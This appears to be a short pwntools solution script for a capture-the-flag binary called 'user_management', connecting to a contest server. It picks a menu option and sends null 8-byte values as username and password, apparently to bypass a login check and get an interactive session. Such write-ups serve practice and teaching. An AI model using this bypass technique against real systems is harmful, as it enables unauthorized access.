from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./user_management")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['kitty', '--']
io = start()

io.sendlineafter("Enter choice: ", b"3")

#io.sendlineafter("Enter choice: ", b"1")
#io.sendlineafter("what do you want to do here?", b"manage users")

io.sendlineafter("Enter username: ", p64(0x0))
io.sendlineafter("Enter password: ", p64(0x0))

io.interactive()